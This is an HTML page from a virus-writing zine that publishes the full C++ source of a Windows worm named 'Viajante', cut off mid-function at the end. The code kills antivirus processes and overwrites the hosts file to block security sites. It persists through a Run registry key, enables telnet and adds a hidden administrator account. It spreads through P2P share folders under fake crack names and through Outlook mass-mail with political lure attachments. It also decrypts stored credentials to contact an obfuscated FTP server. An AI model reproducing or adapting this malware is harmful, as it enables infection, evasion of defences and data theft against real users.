<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Script-Type" content="text/javascript">
<title>RRLF ZINE ISSUE SEVEN   -   SOURCES</title>
<link rel="stylesheet" type="text/css" href="../css/Style.css">
<script src="../js/Preload.js" language="javascript" type="text/javascript"></script>
<script src="../js/Hover.js" language="javascript" type="text/javascript"></script>
</head>

<body>
<table cellpadding="0" cellspacing="0" border="0">
 <tr><td>
 <table align="left" cellpadding="0" cellspacing="0" border="0">
  <tr>
   <td rowspan="3"><a href="../html/editorial.htm"><img src="../images/Top_01.jpg" alt="" border="0"></a></td>
   <td colspan="6"><img src="../images/Top_02.jpg" alt="" border="0"></td>
  </tr>
  <tr>
   <td><a href="../html/articles.htm"><img src="../images/Top_Articles_Out.jpg" alt="" border="0" id="articles" onMouseOver="ArticlesOver(1)" onMouseOut="ArticlesOver(0)"></a></td>
   <td rowspan="2"><img src="../images/Top_03.jpg" alt="" border="0"></td>
   <td><a href="../html/sources.htm"><img src="../images/Top_Sources_Out.jpg" alt="" border="0" id="sources" onMouseOver="SourcesOver(1)" onMouseOut="SourcesOver(0)"></a></td>
   <td rowspan="2"><img src="../images/Top_04.jpg" alt="" border="0"></td>
   <td><a href="../html/art.htm"><img src="../images/Top_Art_Out.jpg" alt="" border="0" id="art" onMouseOver="ArtOver(1)" onMouseOut="ArtOver(0)"></a></td>
   <td rowspan="2"><img src="../images/Top_05.jpg" alt="" border="0"></td>
  </tr>
  <tr>
   <td><img src="../images/Top_06.jpg" alt="" border="0"></td>
   <td><img src="../images/Top_07.jpg" alt="" border="0"></td>
   <td><img src="../images/Top_08.jpg" alt="" border="0"></td>
  </tr>
 </table>
 </td></tr>
 <tr><td>
  <br>
  <div class="title" align="left">Viajante</div>
  <div class="title_by" align="left">by [01100001]</div>
  <pre>
/*
Name: Viajante
Author: [01100001] - Brazil
Date: 13/12/2005
Language: C++
*/

#include &lt;Filectrl.hpp&gt; //para fechar processos
#include &lt;stdio.h&gt;
#include &lt;dos.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;tlhelp32.h&gt;   //para fechar processos
#include &lt;dir.h&gt;        //para pesquisar arquivos        
#include &lt;io.h&gt;
#include &lt;windows.h&gt;
#include "C:\\Arquivos de programas\\Borland\\CBuilder6\\Include\\Vcl\\shellapi.hpp"
#include &lt;mapi.h&gt;
#include &lt;winsock.h&gt;



#define INFORMACAO name: Viajante Author: [01100001] - Brazil

        void Bloquear_Dominios();

        char dir_sys_win[100],dir_win[100];     //Dir SYSTEM32 E WINDOWS

        String ip_net;                          //IP Internet
        String ip_anterior;                     //   ||        


        char login_desencriptado[21] = {0};     //encriptados
        char senha_desencriptada[19] = {0};     //   ||


        char login[21] = {99,51,35,114,82,64,20,2,76,70,78,0,73,18,91,5,93,70,84,108,59};
        char senha[21] = {102,33,53,115,82,77,18,30,68,2,8,23,74,18,95,16,86,63,59,97,49};


        char chave[21] = "ESTACIO_MERDA";                                   //chaves de encriptacao
        char chave_dupla[30] = "s32a1s23d132as1d321a1d3a1s32d1";            //         ||   



        char *arq_ftp;                          //arquivo a ser enviado(ftp)



        //Funcoes Rede
       // void Varre_Driver();
       // void Arq_Compartilhados( char *Driver, int tipo);

        //Funcoes EMail
        int Valida_EMail(char *endereco);

        void Bloquear_Dominios();

        //Vars EMail
        char *ptrEgo, *buf;
        char Lista_Enderecos[50][128];


        AnsiString ANEXOS[3] = {"Palocci_x_Lula.exe",
                        "Lula_FOME_0.exe",
                        "Lula_Mendigo.exe"};

        AnsiString ATTACHS[3] = {"Colloquy_funny_Bush_KimII_Sung.exe",
                          "frightful negotiation.exe",
                          "Animation_Flash_colloquy.exe"};



        char *arquivos =  __argv[0];                            //busca o arquivo a ser anexado, no caso o que esta sendo executado//se espalhar pelas unidades


        WIN32_FIND_DATA FileData;     //Data arquivo

        OSVERSIONINFO OsVer;          //Versao Windows


        //var SOCKET
        WSAData wsa;                     //inicia SOCKET


void Auto_Copiar()
{

        String arquivo_origem = __argv[ 0 ];                           //Busca caminho completo executado

        GetSystemDirectory((char *)dir_sys_win,100);                    //busca dir do SYSTEM32 do Windows

        strcat(dir_sys_win,"\\tasklists.exe");     //C:\\%WINDIR%\\SYSTEM32\\tasklists.exe


        CopyFile(arquivo_origem.c_str(),dir_sys_win,false);     //se auto copia para SYSTEM32

        SetFileAttributes( dir_sys_win,FILE_ATTRIBUTE_HIDDEN);  //seta atributos para oculto

}


void Escreve_Registro()          //Funcao tratamento no registro
{

        HKEY chave;

        GetSystemDirectory((char *)dir_sys_win,100);                   //%WINDIR%//SYSTEM32 do Windows

        strcat(dir_sys_win,"\\tasklists.exe");                        //C:\\%WINDIR%\\SYSTEM32\\tasklists.exe

        RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, NULL, NULL, KEY_ALL_ACCESS, NULL, &chave, NULL);           //Cria Chave

        RegSetValueEx(chave,"Tasklists", 0, REG_SZ, (const BYTE*)dir_sys_win, sizeof(dir_sys_win));                                                                            //Seta valores para chave

        RegCloseKey(chave);


}


void Para_AV(char *AV)
{

        HANDLE proc_id;                                                    //ID do processo
        HANDLE hSnapShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);   //Pega as heaps, modules, and threads do processo
        PROCESSENTRY32 processInfo;                                        //Lista para pegar numeros processos (modulo,tamanho,thread do determinado processo)

        do
        {
                if (strcmp(processInfo.szExeFile,AV)==0)   //compara se nome do processo é processo procurado
                {

                        proc_id = OpenProcess(PROCESS_TERMINATE,false,processInfo.th32ProcessID);   //abre o processo para termina-lo com a respectiva ID

                        if (proc_id != NULL)                             //Veirifica se achou mesmo
                        {
                                TerminateProcess(proc_id,0);             //termina o processo
                                CloseHandle(proc_id);                    //fecha o handle para esse processo

                        }

                }

       }

        while(Process32Next(hSnapShot,&processInfo) != false);          //enquanto nao acabar os processos ficar procurando

}


void Payloads()
{

        //var telnet e usuario
        HKEY chave;
        DWORD valor = 2;
        LONG  resultado;


        FILE *protesto;
        String msg_br = "UNIVERSIDADE ESTÁCIO DE SÁ - Brasil)\n\nVAI TOMAR NO CU E SE FODER OTÁRIOS, ODEIO VOCÊS\n... HAHAHA\n\n";
        String msg_us = "UNIVERSITY ESTÁCIO DE SÁ - Brazil)\n\nFUCK ITS SUCKERS, I HATE YOU... LOL";


        if( OsVer.dwPlatformId == 2 )    //É NT,2000,XP ou 2003 abrir telnet e adicionar usuario
        {

                resultado = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TlntSvr",0,KEY_ALL_ACCESS,&chave);     //Abre chave

                if( resultado == ERROR_SUCCESS )                                                                                         	//Verifica se achou
                {
                        RegSetValueEx(chave,"Start",0,REG_DWORD,(BYTE*)&valor,sizeof(valor));                                           			//Seta servico(telnet) para habilitado
                }

                RegCloseKey(chave);


                if( GetSystemDefaultLangID() == 0x0416 )               //Verifica se é Brasil
                {
                        GetSystemDirectory((char *)dir_sys_win,100);                    //busca dir do SYSTEM32 do Windows

                        WinExec(strcat(dir_sys_win,"\\net.exe user support viajante /add"),SW_HIDE);                    //adicionar user

                        GetSystemDirectory((char *)dir_sys_win,100);                                                    //limpa

                        WinExec(strcat(dir_sys_win,"\\net.exe localgroup Administradores support /add"),SW_HIDE);      //seta usuario para grupo ADM


                }
                else                                                    //outros paises
                {

                        GetSystemDirectory((char *)dir_sys_win,100);

                        WinExec(strcat(dir_sys_win,"\\net.exe user support viajante /add"),SW_HIDE);

                        GetSystemDirectory((char *)dir_sys_win,100);

                        WinExec(strcat(dir_sys_win,"\\net.exe localgroup Administrators support /add"),SW_HIDE);


                }

       }


       if( GetSystemDefaultLangID() == 0x0416 ) //Brasil ?
        {

                if( OsVer.dwPlatformId == 2 )     //É NT,2000,XP ou 2003
                {

                        if( (DirectoryExists("C:\\Documents and Settings\\All Users\\Desktop") == true) || (DirectoryExists("D:\\Documents and Settings\\All Users\\Desktop")) )
                        {
                                protesto = fopen("C:\\Documents and Settings\\All Users\\Desktop\\Protesto!!!.txt","w");

                                if( protesto != NULL )
                                {
                                        fputs(msg_br.c_str(),protesto);
                                }

                                fclose(protesto);

                        }

                      Bloquear_Dominios();

                }
                else
                {
                        if( (DirectoryExists("C:\\WINDOWS\\Desktop") == true) || (DirectoryExists("D:\\WINDOWS\\Desktop") == true) )
                        {
                                protesto = fopen("C:\\WINDOWS\\Desktop\\Protesto!!!.txt","w");

                                if( protesto != NULL )
                                {
                                        fputs(msg_br.c_str(),protesto);
                                }

                                fclose(protesto);
                        }

                }

         }
         else      //caso seja gringo
         {

                if( OsVer.dwPlatformId == 2 )     //É NT,2000,XP ou 2003
                {

                        if( (DirectoryExists("C:\\Documents and Settings\\All Users\\Desktop") == true) || (DirectoryExists("D:\\Documents and Settings\\All Users\\Desktop")) )
                        {
                                protesto = fopen("C:\\Documents and Settings\\All Users\\Desktop\\Protest!!!.txt","w");

                                if( protesto != NULL )
                                {
                                        fputs(msg_us.c_str(),protesto);
                                }

                                fclose(protesto);

                        }
                }
                else
                {
                        if( (DirectoryExists("C:\\WINDOWS\\Desktop") == true) || (DirectoryExists("D:\\WINDOWS\\Desktop") == true) )
                        {
                                protesto = fopen("C:\\WINDOWS\\Desktop\\Protest!!!.txt","w");

                                if( protesto != NULL )
                                {
                                        fputs(msg_us.c_str(),protesto);
                                }

                                fclose(protesto);
                        }

                }



         }
         
}



void P2P()
{

        String Arquivos[6] =                                  //possiveis nomes para se espalhar
        {"\\SerialKey_Counter-Striker_CZ.exe",
        "\\Crack_Norton2005.exe",
        "\\Crack_Microsoft-Office_XP.exe",
        "\\Crack_Doom3.exe",
        "\\Crack_Windows_Vista.exe",
        "\\Crack_GTA_SanAndreas.exe"};

        int i;

        String origem = __argv[ 0 ];                    //dir atual do arquivo
        String  dirp2p,nomep2p;



        for(i = 0; i &lt;= 6;i++)                          //Loop para criacao dos arquivos
        {

                if( (DirectoryExists("C:\\Arquivos de programas\\Shareaza\\") == true ) || (DirectoryExists("C:\\Program Files\\Shareaza\\") == true) )
                {

                        dirp2p = "C:\\Arquivos de programas\\Shareaza\\Downloads\\1.exe";                                       //dir destino do p2p
                        nomep2p = "C:\\Arquivos de programas\\Shareaza\\Downloads" + Arquivos[i];                               //dir + nome do arquivo criado


                        CopyFile(origem.c_str(),dirp2p.c_str(),false);                                                                  //copia para dir do p2p

                        RenameFile(dirp2p.c_str(),nomep2p);                                                                             //renomeia o arquivo para compartilhar

                        DeleteFile(dirp2p);                                                                                             //deleta o programa original no dir do p2p

                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);                                //oculto o arquivo criado


                        dirp2p = NULL;                                                                                                   //0 variaveis
                        nomep2p = NULL;
                        dirp2p = "C:\\Program Files\\Shareaza\\Downloads\\1.exe";                                               // prepara caso o SO seja em ingles
                        nomep2p = "C:\\Program Files\\Shareaza\\Downloads" + Arquivos[i];                                              //
                                                                                                                                       //
                        CopyFile(origem.c_str(),dirp2p.c_str(),false);                                                                 //
                                                                                                                                       //
                        RenameFile(dirp2p.c_str(),nomep2p);                                                                            //
                                                                                                                                       //
                        DeleteFile(dirp2p);

                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);                                                                                            //
                                                                                                                                       //
                }                                                                                                                      //

                if( (DirectoryExists("C:\\Arquivos de programas\\eMule\\") == true ) || (DirectoryExists("C:\\Program Files\\eMule\\") == true ) )
                {


                        dirp2p = NULL;                                                                                                 //0 variaveis
                        nomep2p = NULL;
                        dirp2p = "C:\\Arquivos de programas\\eMule\\\Incoming\\2.exe";
                        nomep2p = "C:\\Arquivos de programas\\eMule\\\Incoming" + Arquivos[i];


                        CopyFile(origem.c_str(),dirp2p.c_str(),false);

                        RenameFile(dirp2p.c_str(),nomep2p);

                        DeleteFile(dirp2p);


                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);


                        dirp2p = NULL;
                        nomep2p = NULL;
                        dirp2p = "C:\\Program Files\\eMule\\\Incoming\\2.exe";
                        nomep2p = "C:\\Program Files\\eMule\\\Incoming" + Arquivos[i];

                        CopyFile(origem.c_str(),dirp2p.c_str(),false);

                        RenameFile(dirp2p.c_str(),nomep2p);

                        DeleteFile(dirp2p);


                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);

                }

                if( (DirectoryExists("C:\\Arquivos de programas\\Kazaa Lite K++\\") == true ) || (DirectoryExists("C:\\Program Files\\Kazaa Lite K++\\") == true)
                    || (DirectoryExists("C:\\Arquivos de programas\\Kazaa Lite Resurrection\\") == true ) || (DirectoryExists("C:\\Program Files\\Kazaa Lite Resurrection\\") == true) )
                {


                        dirp2p = NULL;                                                                                                   //0 variaveis
                        nomep2p = NULL;
                        dirp2p = "C:\\My Shared Folder\\3.exe";
                        nomep2p = "C:\\My Shared Folder" + Arquivos[i];


                        CopyFile(origem.c_str(),dirp2p.c_str(),false);

                        RenameFile(dirp2p.c_str(),nomep2p);

                        DeleteFile(dirp2p);


                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);

                }


                if( (DirectoryExists("C:\\Arquivos de programas\\KaZaA\\My Shared Folder\\") == true) || (DirectoryExists("C:\\Program files\\KaZaA\\My Shared Folder") == true)  )
                {


                        dirp2p = NULL;                                                                                                   //0 variaveis
                        nomep2p = NULL;
                        dirp2p = "C:\\Arquivos de programas\\KaZaA\\My Shared Folder\\4.exe";
                        nomep2p = "C:\\Arquivos de programas\\KaZaA\\My Shared Folder" + Arquivos[i];


                        CopyFile(origem.c_str(),dirp2p.c_str(),false);

                        RenameFile(dirp2p.c_str(),nomep2p);

                        DeleteFile(dirp2p);


                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);


                        dirp2p = NULL;
                        nomep2p = NULL;
                        dirp2p = "C:\\Program Files\\KaZaA\\My Shared Folder\\4.exe";
                        nomep2p = "C:\\Program Files\\KaZaA\\My Shared Folder\\" + Arquivos[i];

                        CopyFile(origem.c_str(),dirp2p.c_str(),false);

                        RenameFile(dirp2p.c_str(),nomep2p);

                        DeleteFile(dirp2p);


                        SetFileAttributes(nomep2p.c_str(),FILE_ATTRIBUTE_HIDDEN);



                }


        }

                SetFileAttributes(__argv[ 0 ],FILE_ATTRIBUTE_NORMAL);           //Seta o executavel para Normal
}

int Outlook()
{

        HINSTANCE hi;
        LPMAPILOGON MAPILogon;
        LPMAPIFINDNEXT MAPIFindNext;
        LPMAPIREADMAIL MAPIReadMail;
        LPMAPISENDMAIL MAPISendMail;
        LPMAPILOGOFF MAPILogoff;
        LHANDLE Sessao;
        CHAR rgchMsgID[513];
        MapiMessage *Mensagem;
        int i=0;
       

        SYSTEMTIME systime;                     //Var para dias da semana
        GetSystemTime(&systime);                //para buscar o dia corrente(hoje)
        FILE *lista;
        char emails[1000];

       
        hi = LoadLibrary( "mapi32.dll" );               //Carrega dll na memoria

        if( hi == NULL )                               //senao carregou a dll
        {
                return -1;
        }

        MAPILogon = (LPMAPILOGON)GetProcAddress( hi, "MAPILogon");                   //pega enderecos das APIs MAPI
        MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress( hi, "MAPIFindNext");
        MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress( hi, "MAPIReadMail");
        MAPISendMail = (LPMAPISENDMAIL)GetProcAddress( hi, "MAPISendMail");
        MAPILogoff = (LPMAPILOGOFF)GetProcAddress( hi,"MAPILogoff");

        if( MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL || MAPISendMail == NULL )   //Verifica se achou msg e se esta tudo OK
        {
                return -1;
        }



        if( MAPILogon( 0, NULL, NULL, 0, 0, &Sessao) == SUCCESS_SUCCESS)               //Se conseguiu logar
        {
                *rgchMsgID = NULL;


                  while( i &lt; 50 )                    //Varre em busca de msg recebidas
                  {
                         if( MAPIFindNext( Sessao, 0L, NULL, rgchMsgID, MAPI_LONG_MSGID, 0L, rgchMsgID) != SUCCESS_SUCCESS)   //proxima msg
                         {
                                 break;
                         }

                         if( MAPIReadMail( Sessao, 0L, rgchMsgID, MAPI_PEEK, 0L, &Mensagem) == SUCCESS_SUCCESS)                 //le o email destino para host
                         {

                                if( Valida_EMail( Mensagem-&gt;lpOriginator-&gt;lpszAddress) == 0 )                                  //verifica se achou a msg mesmo
                                {
                                        strcpy( Lista_Enderecos[i], Mensagem-&gt;lpOriginator-&gt;lpszAddress);                       //concatena a lista de email para a lista_enderecos[i]
                                        i++;
                                }

                         }



                  }

                  MAPIFreeBuffer( Mensagem );                     //limpa o buffer da leitura

                  int recipNum = i;


                  MapiRecipDesc *recip  = (MapiRecipDesc *)malloc( recipNum*sizeof(MapiRecipDesc) );     //corpo da msg


                  for( int i=0 ; i&lt;recipNum ; i++ )                        //montando a msg email origem, email dest...
                  {
                        recip[i].ulReserved   = 0;
                        recip[i].ulRecipClass = MAPI_TO;
                        recip[i].lpszName     = Lista_Enderecos[i];
                        recip[i].lpszAddress  = Lista_Enderecos[i];
                        recip[i].ulEIDSize    = 0;
                        recip[i].lpEntryID    = NULL;
                  }


                  if( GetSystemDefaultLangID() == 0x0416 )               //Verifica se é Brasil
                  {

                        if ( (systime.wDayOfWeek == 0) || (systime.wDayOfWeek == 1) )   //caso seja domingo ou segunda
                        {

                                MapiFileDesc arq_anexado = { 0, 0, (ULONG)-1, arquivos , ANEXOS[0].c_str() , NULL};      //anexa o arq


                                MapiMessage corpo_msg = { 0, "Charge Palocci x Lula","Ola tudo bem? Estou te enviando uma charge que recebi de um amigo da CPI que envolve o Palocci e o Lula discutindo, Abraços.", NULL, NULL, NULL, 0, NULL, recipNum, recip, 1, &arq_anexado};      //corpo da msg em si


                                if( MAPISendMail( Sessao, 0L, &corpo_msg, 0L, 0L) != SUCCESS_SUCCESS )     //envia o email
                                {
                                        return -1;
                                }

                        }


                        if( (systime.wDayOfWeek == 2) || (systime.wDayOfWeek == 3) )    //caso seja terca ou quarta
                        {
                                MapiFileDesc arq_anexado = { 0, 0, (ULONG)-1, arquivos , ANEXOS[1].c_str() , NULL};


                                MapiMessage corpo_msg = { 0, "Lula no FOME 0... morri de rir", "Ola tudo bem? Estou te enviando uma charge em que o o Lula mostra como acabar com a fome no Brasil, muito interessante , Abraços.", NULL, NULL, NULL, 0, NULL, recipNum, recip, 1, &arq_anexado};


                                if( MAPISendMail( Sessao, 0L, &corpo_msg, 0L, 0L) != SUCCESS_SUCCESS )
                                {
                                        return -1;
                                }
                        }


                        if( (systime.wDayOfWeek == 4)  || (systime.wDayOfWeek == 5) || (systime.wDayOfWeek == 6) )  //caso seja quinta,sexta ou sabado
                        {
                                MapiFileDesc arq_anexado = { 0, 0, (ULONG)-1, arquivos , ANEXOS[2].c_str() , NULL};


                                MapiMessage corpo_msg = { 0, "Charge Lula na corda bamba", "Ola tudo bem? Estou te enviando uma charge da situação atual do governo em que o próprio Lula vira mendigo..., Abraços.", NULL, NULL, NULL, 0, NULL, recipNum, recip, 1, &arq_anexado};


                                if( MAPISendMail( Sessao, 0L, &corpo_msg, 0L, 0L) != SUCCESS_SUCCESS )
                                {
                                        return -1;
                                }

                        }


                  }
                  else     //caso seja outro pais
                  {
                        if ( (systime.wDayOfWeek == 0) || (systime.wDayOfWeek == 1) )   //caso seja domingo ou segunda
                        {

                                MapiFileDesc arq_anexado = { 0, 0, (ULONG)-1, arquivos , ATTACHS[0].c_str() , NULL};      //anexa o arq


                                MapiMessage corpo_msg = { 0, "Colloquy funny between Bush e President Korea of the North", "Hey how are you friend? I am sending a animation funny of one colloquy funny negotiation between Bush and Kim II Sung! hugs friend.", NULL, NULL, NULL, 0, NULL, recipNum, recip, 1, &arq_anexado};      //corpo da msg em si


                                if( MAPISendMail( Sessao, 0L, &corpo_msg, 0L, 0L) != SUCCESS_SUCCESS )     //envia o email
                                {
                                        return -1;
                                }

                        }


                        if ( (systime.wDayOfWeek == 2) || (systime.wDayOfWeek == 3) )   //caso seja terca ou quarta
                        {

                                MapiFileDesc arq_anexado = { 0, 0, (ULONG)-1, arquivos , ATTACHS[1].c_str() , NULL};      //anexa o arq


                                MapiMessage corpo_msg = { 0, "War beetwen Korea of the North and EUA", "Hey how are you friend? Hey how are you friend? Hi, it sees stretch of this frightful negotiation! hugs friend.", NULL, NULL, NULL, 0, NULL, recipNum, recip, 1, &arq_anexado};      //corpo da msg em si


                                if( MAPISendMail( Sessao, 0L, &corpo_msg, 0L, 0L) != SUCCESS_SUCCESS )     //envia o email
                                {
                                        return -1;
                                }

                        }

                        if ( (systime.wDayOfWeek == 4) || (systime.wDayOfWeek == 5) || (systime.wDayOfWeek == 6) )   //caso seja quinta, sexta ou sabado
                        {

                                MapiFileDesc arq_anexado = { 0, 0, (ULONG)-1, arquivos , ATTACHS[2].c_str() , NULL};      //anexa o arq


                                MapiMessage corpo_msg = { 0, "Animation Colloquy Bush and Kim II Sung ", "Hey how are you friend? Hi, I received this animation in flash from a colloquy between Bush and Kim II-Sung(President Korea of the north),I wait that it likes! hugs friend.", NULL, NULL, NULL, 0, NULL, recipNum, recip, 1, &arq_anexado};      //corpo da msg em si


                                if( MAPISendMail( Sessao, 0L, &corpo_msg, 0L, 0L) != SUCCESS_SUCCESS )     //envia o email
                                {
                                        return -1;
                                }


                        }


                  }


                  free( recip );      //retira da memoria o corpo da msg montada


                 MAPILogoff( Sessao, 0L, 0L, 0L);              //efetua logoff do MAPI

        }

                return 0;

}


int Valida_EMail(char *endereco)
{

        if( strlen( endereco ) &gt;= 128 || strlen( endereco ) == 0)
        {
                return -1;
        }
        else
        {
                if( strchr( endereco , '@') == NULL )
                {
                        return -1;
                }
                else
                {
                        if( strchr( endereco , '.') == NULL )
                        {
                                return -1;
                        }
                        else
                        {
                                return 0;
                        }

                }

        }

}



void ftp()
{

        FILE *IP;

        SOCKADDR_IN ServerFTP;
        SOCKET Socket;


        char servidor_encriptado[17] = {80,20,22,14,19,84,26,9,69,18,8,4,69,93,82,11,94};

        char servidor_desencriptado[17] = {0};


        //decripta
        for(int i = 0; i &lt; 17; i++)
        {
              servidor_desencriptado[i] = chave_dupla[i] ^ chave[i] ^ servidor_encriptado[i];
        }



        int Retorno;                                            // Armazena o retorno

        if((IP=fopen(dir_sys_win,"wt")) != NULL)                    //verificacao na criacao do arq
        {

                fprintf(IP,"%s","viajante...rs");                   //escreve
                fclose(IP);

                SetFileAttributes(dir_sys_win,FILE_ATTRIBUTE_HIDDEN);   //seta como oculto


                WSAStartup(0x101, &wsa);        //inicia a biblioteca socket


                ServerFTP.sin_family = AF_INET;                              //protocolo padrao
                ServerFTP.sin_port = htons(21);                              //porta

                hostent *Host=gethostbyname(servidor_desencriptado);         //busca endereco(ftp.angelfire.com)

                ServerFTP.sin_addr.s_addr = *((unsigned long *) Host-&gt;h_addr);      //endereco a IP a conectar


                Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);          //cria socket


                Retorno = connect(Socket,(sockaddr *)&ServerFTP,sizeof(ServerFTP));    //conecta ao servidor


                if( Retorno == 0 )                                      //verifica se conectou
                {

                        send(Socket,login_desencriptado,strlen(login_desencriptado),0);     //user

                        send(Socket,senha_desencriptada,strlen(senha_desencriptada),0);      //password

                        send(Socket,"PASV\r\n",strlen("PASV\r\n"),0);                //modo passivo

                        send(Socket,"TYPE A\r\n",strlen("TYPE A\r\n"),0);           //para arquivos ASCII

                        send(Socket,arq_ftp,strlen(arq_ftp),0);                     //envia  o arquivo

                        send(Socket,"QUIT\r\n",strlen("QUIT\r\n"),0);               //fechar conexao
                 
                }


                closesocket(Socket);                                                         //fecha socket

                WSACleanup();                                                                  //destroi socket

                DeleteFile(dir_sys_win);                                                        //apaga para nao deixar lixo no system32


        }



}

/*
void Varre_Driver()
{
        int tamanho;
        char buff[128];
        char *ptr;

        ptr = buff;
        tamanho = GetLogicalDriveStrings( 128, ptr);            //Busca os drivers presentes


        if( (tamanho &gt; 0) && (tamanho &lt; 128) )
        {
            for( int i=0 ; i&lt;= 25 ; i++ )                       //varre por 25 drivers
            {
                    switch( GetDriveType( ptr ) )                 //procura se o driver é local ou remoto
                    {

                        case DRIVE_FIXED:
                        Arq_Compartilhados(ptr,1);
                        break;

                        case DRIVE_REMOTE:                          //driver remoto
                                Arq_Compartilhados( ptr,1 );
                        break;

                        default:
                        break;
                    }                                           //Aponta para o proximo driver
                *ptr+=1;
            }
        }

      return;
}

void Arq_Compartilhados( char *Driver, int tipo)
{
        FILE *ArqAutorun;
        char buff[128];

        if( tipo == 1)                                          //caso o driver seja local
        {
                sprintf(buff,"%s%s",Driver,"viajante.exe");
        }
        else
        {                                                              //seja remoto
                sprintf(buff,"%s\\%s", Driver,"viajante.exe");
        }

        if( CopyFile( arquivos, buff, FALSE) == TRUE && tipo == 1 )                 //auto copiar para a unidade
        {

                 _rtl_chmod(buff, 1, FA_HIDDEN | FA_RDONLY);                         //oculta arquivo de auto copia

                 sprintf( buff, "%sAutorun.inf", Driver);                            //cria arquivo *.inf

                 ArqAutorun = fopen(buff, "w");                                      //Abre para escrever

                   if( ArqAutorun != NULL )
                   {

                        fprintf( ArqAutorun, "[Autorun]\nOPEN=%s\n","viajante.exe");           //escreve no *.inf
                        fclose( ArqAutorun );
                        _rtl_chmod(buff, 1, FA_HIDDEN | FA_RDONLY);                           //oculta *.inf

                   }


       }

        return;
} */


void Bloquear_Dominios()
{

    char *sites[] =
    {
    "www.antivirus.com",
    "www.claymania.com",
    "www.free-av.com",
    "www.bitdefender.com",
    "www.commandcom.com",
    "www.dials.ru",
    "www1.my-etrust.com",
    "www.f-prot.com",
    "www.avg.com.br",
    "www.avg.com",
    "www.avast.com",
    "www.f-secure.com",
    "www.grisoft.com",
    "antivirus.cai.com",
    "www.avp.ru",
    "www.nai.com",
    "www.nod32.com.au",
    "www.norman.com",
    "www.symantec.com",
    "www.symantec.com.br",
    "www.pandasoftware.com",
    "www.pandasoftware.com.br",
    "www.pandasoftware.es",
    "www.sophos.com",
    "www.trend.com",
    "www.commandondemand.com",
    "www.dialognauka.ru",
    "www.veloz.com",
    "support.ikarus.at",
    "www.kaspersky.com",
    "www.hauri.net",
    "antivirus.mafia.ru",
    "www.mcafee.com",
    "www.mcafee.com.br",
    "www.webimmune.net",
    "www.pandasoftware.com",
    "www.pcpitstop.com",
    "www.ravantivirus.com",
    "security1.norton.com",
    "housecall.antivirus.com",
    "www.freedom.net",
    "www.invircible.com",
    "www.orkut.com",
    "www.google.com",
    "www.google.com.br"
    };

    char str[MAX_PATH];
    FILE *hosts;


    if( OsVer.dwPlatformId == 2 )   //caso seja NT/2000/XP/2003
    {

        GetSystemDirectory((char *)dir_sys_win,100);     //%WINDIR%/System32

        strcat(dir_sys_win,"\\drivers\\etc\\hosts");

        hosts = fopen(dir_sys_win , "w");

        if( hosts != NULL )
        {
                fputs("127.0.0.1 localhost\n", hosts);

                for (int n = 0; n &lt;= 45; n++)
                {
                        wsprintf(str, "0.0.0.0 %s\n", sites[n]);      //Preenche o arquivos com a lista de sites com IPS 0s
                        fputs(str, hosts);
                }

                fclose(hosts);
        }




    }
    else
    {

        GetWindowsDirectory((char *)dir_win,100);

        strcat(dir_win,"\\hosts");

        hosts = fopen(dir_win,"w");

        if( hosts != NULL )
        {
                fputs("127.0.0.1 localhost\n", hosts);

                for (int n = 0; n &lt;= 42; n++)
                {
                        wsprintf(str, "0.0.0.0 %s\n", sites[n]);
                        fputs(str, hosts);
                }

                fclose(hosts);
        }


     }

}


WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)        //funcao de janelas WIN32 GUI(para esconder aplicacao)
{

                //var SOCKET
                hostent *IP;
                char nome[256];

                String ip_anterior;

                OsVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);          //Obter tamanho da estrutura
                GetVersionEx(&OsVer);                                       //chama funcao


              //          Sleep(20000);                                           //Dorme 15s para espera do carregamento dos AVs.. hehehe

                        Para_AV("avgcc.exe");
                        Para_AV("navapw.exe");
                        Para_AV("navapw32.exe");
                        Para_AV("navapsvc.exe");
                        Para_AV("scan32.exe");
                        Para_AV("VPTray.exe");
                        Para_AV("ashwebsv.exe");
                        Para_AV("avp32.exe");
                        Para_AV("avpcc.exe");
                        Para_AV("avpm.exe");
                        Para_AV("Zonealarm.exe");
                        Para_AV("Wfindv32.exe");
                        Para_AV("Webscanx.exe");
                        Para_AV("Pccwin98.exe");
                        Para_AV("Pavw.exe");
                        Para_AV("Pavsched.exe");
                        Para_AV("Pavcl.exe");
                        Para_AV("Padmin.exe");
                        Para_AV("kav.exe");
                        Para_AV("kavsvc.exe");

                     //      Escreve_Registro();

                     //      Auto_Copiar();

                     //      Payloads();

                    //       P2P();

                           Outlook();

                       //    Varre_Driver();


                //decripta

                for(int i = 0; i &lt; 21; i++)
                {
                        login_desencriptado[i] = chave_dupla[i] ^ chave[i] ^ login[i];

                }

                for(int i = 0 ; i &lt; 19; i++)
                {
                        senha_desencriptada[i] = chave_dupla[i] ^ chave[i] ^ senha[i];

                }


                if( (FileExists("C:\\WINDOWS\\viajante.exe") != true) || (FileExists("D:\\WINDOWS\\viajante.exe") != true) )
                {

                        if( OsVer.dwPlatformId == 1 )         //Verifica se é win 9X e ME
                        {
                                RenameFile("C:\\WINDOWS\\regedit.exe","C:\\WINDOWS\\viajante.exe");      //para nao editar mais o registro...rs

                                RenameFile("D:\\WINDOWS\\regedit.exe","D:\\WINDOWS\\viajante.exe");
                        }

                }



                for(;;)                 //loop infinito sempre varrendo em busca do IP na net
                {


                        Sleep(300000);      //dorme por 5 minutos


